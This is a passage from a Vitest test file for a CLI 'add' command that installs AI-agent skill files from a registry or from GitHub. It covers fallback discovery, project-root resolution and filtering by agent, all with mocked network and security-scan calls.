    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });
  });

  it("installs a skill when registry returns content", async () => {
    mockGetSkill.mockResolvedValue({
      name: "my-skill",
      author: "alice",
      tier: "VERIFIED",
      score: 90,
      version: "1.0.0",
      sha: "",
      description: "A skill",
      content: "# My Skill\nDoes great things.",
      installs: 5,
      updatedAt: "2026-01-01T00:00:00Z",
    });

    await addCommand("my-skill", {});

    expect(mockGetSkill).toHaveBeenCalledWith("my-skill");
    expect(mockRunTier1Scan).toHaveBeenCalledWith("# My Skill\nDoes great things.");
    expect(mockWriteFileSync).toHaveBeenCalledWith(
      expect.stringContaining("my-skill"),
      "# My Skill\nDoes great things.",
      "utf-8"
    );
    expect(mockWriteLockfile).toHaveBeenCalledWith(
      expect.objectContaining({
        skills: expect.objectContaining({
          "my-skill": expect.objectContaining({ source: "registry:my-skill" }),
        }),
      })
    );
  });

  it("exits with error when skill is not in registry", async () => {
    mockGetSkill.mockRejectedValue(new Error("API request failed: 404 Not Found"));
    const mockExit = vi.spyOn(process, "exit").mockImplementation((() => {}) as () => never);

    await addCommand("nonexistent-skill", {});

    expect(mockExit).toHaveBeenCalledWith(1);
    mockExit.mockRestore();
  });

  it("falls back to GitHub install via repoUrl when content is missing", async () => {
    mockGetSkill.mockResolvedValue({
      name: "remotion-dev-skills-remotion",
      author: "remotion-dev",
      tier: "VERIFIED",
      score: 100,
      version: "1.0.0",
      sha: "",
      description: "Remotion skill",
      content: undefined,
      installs: 0,
      updatedAt: "2026-02-20T00:00:00Z",
      repoUrl: "https://github.com/remotion-dev/skills",
    });

    // After fallback, addCommand calls discoverSkills("remotion-dev", "skills")
    mockDiscoverSkills.mockResolvedValue([
      { name: "remotion", path: "skills/remotion/SKILL.md", rawUrl: "https://raw.githubusercontent.com/remotion-dev/skills/main/skills/remotion/SKILL.md" },
    ]);
    // Then fetches the skill content from GitHub
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Remotion skill content",
    }) as unknown as typeof fetch;

    await addCommand("remotion-dev-skills-remotion", {});

    expect(mockDiscoverSkills).toHaveBeenCalledWith("remotion-dev", "skills");
    expect(mockWriteFileSync).toHaveBeenCalledWith(
      expect.stringContaining("remotion"),
      "# Remotion skill content",
      "utf-8"
    );
  });

  it("falls back to GitHub install via author/skillName when repoUrl is absent", async () => {
    mockGetSkill.mockResolvedValue({
      name: "some-skill",
      author: "bob",
      tier: "SCANNED",
      score: 50,
      version: "0.1.0",
      sha: "",
      description: "",
      content: undefined,
      installs: 0,
      updatedAt: "2026-01-01T00:00:00Z",
    });

    // Fallback uses author/skillName → discoverSkills("bob", "some-skill")
    mockDiscoverSkills.mockResolvedValue([]);
    // Discovery empty → falls back to root SKILL.md fetch
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Some skill",
    }) as unknown as typeof fetch;

    await addCommand("some-skill", {});

    expect(mockDiscoverSkills).toHaveBeenCalledWith("bob", "some-skill");
    expect(mockRunTier1Scan).toHaveBeenCalled();
  });

  it("exits when no content, no repoUrl, and no author", async () => {
    mockGetSkill.mockResolvedValue({
      name: "",
      author: "",
      tier: "SCANNED",
      score: 0,
      version: "0.0.0",
      sha: "",
      description: "",
      content: undefined,
      installs: 0,
      updatedAt: "",
    });
    const mockExit = vi.spyOn(process, "exit").mockImplementation((() => {}) as () => never);

    await addCommand("mystery-skill", {});

    expect(mockExit).toHaveBeenCalledWith(1);
    mockExit.mockRestore();
  });
});

// ---------------------------------------------------------------------------
// T-012 through T-015: Smart project root and agent filter integration
// ---------------------------------------------------------------------------

describe("addCommand smart project root resolution", () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;

    mockCheckBlocklist.mockResolvedValue(null);
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  // TC-012: Install from subdirectory resolves to project root
  it("installs skill relative to project root when cwd is a subdirectory", async () => {
    const projectRoot = "/home/user/project";
    mockFindProjectRoot.mockReturnValue(projectRoot);

    await addCommand("owner/safe-repo", {});

    // writeFileSync should write to <projectRoot>/.claude/commands/<skill>/SKILL.md
    expect(mockWriteFileSync).toHaveBeenCalled();
    const writePath = mockWriteFileSync.mock.calls[0][0] as string;
    expect(writePath).toContain(projectRoot);
    expect(writePath).toContain(".claude/commands");
  });

  // TC-013: --cwd flag uses process.cwd() directly
  it("installs relative to process.cwd() when --cwd flag is used", async () => {
    const projectRoot = "/home/user/project";
    mockFindProjectRoot.mockReturnValue(projectRoot);

    await addCommand("owner/safe-repo", { cwd: true });

    // findProjectRoot should NOT be consulted for the base dir when --cwd
    // writeFileSync should write relative to process.cwd(), not projectRoot
    const writePath = mockWriteFileSync.mock.calls[0][0] as string;
    expect(writePath).toContain(process.cwd());
    // Should NOT be under projectRoot (unless cwd === projectRoot)
    expect(writePath).not.toContain(projectRoot);
  });
});

describe("addCommand --agent filter", () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;

    mockCheckBlocklist.mockResolvedValue(null);
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  // TC-014: --agent filters to specific agent
  it("installs only to the filtered agent when --agent is provided", async () => {
    const claude = makeAgent({ id: "claude-code", displayName: "Claude Code" });
    const cursor = makeAgent({
      id: "cursor",
      displayName: "Cursor",
      localSkillsDir: ".cursor/skills",
      globalSkillsDir: "~/.cursor/skills",
    });

    mockDetectInstalledAgents.mockResolvedValue([claude, cursor]);
    // filterAgents returns only claude when agent=["claude-code"]
    mockFilterAgents.mockReturnValue([claude]);

    await addCommand("owner/safe-repo", { agent: ["claude-code"] });

    // filterAgents should have been called with both agents and the filter
    expect(mockFilterAgents).toHaveBeenCalledWith(
      [claude, cursor],
      ["claude-code"],
    );

    // Only 1 write (to claude-code), not 2
    expect(mockWriteFileSync).toHaveBeenCalledTimes(1);
    const writePath = mockWriteFileSync.mock.calls[0][0] as string;
    expect(writePath).toContain(".claude/commands");
  });

  // TC-015: --agent with invalid ID shows error
  it("exits with error when --agent specifies unknown ID", async () => {
    const claude = makeAgent();
    mockDetectInstalledAgents.mockResolvedValue([claude]);
    mockFilterAgents.mockImplementation(() => {
      throw new Error("Unknown agent(s): nonexistent. Available: claude-code");
    });
    const mockExit = vi.spyOn(process, "exit").mockImplementation((() => {}) as () => never);
    const mockConsoleError = vi.spyOn(console, "error").mockImplementation(() => {});

    await addCommand("owner/safe-repo", { agent: ["nonexistent"] });

    expect(mockExit).toHaveBeenCalledWith(1);
    // Should NOT have written any files
    expect(mockWriteFileSync).not.toHaveBeenCalled();

    mockExit.mockRestore();
    mockConsoleError.mockRestore();
  });
});
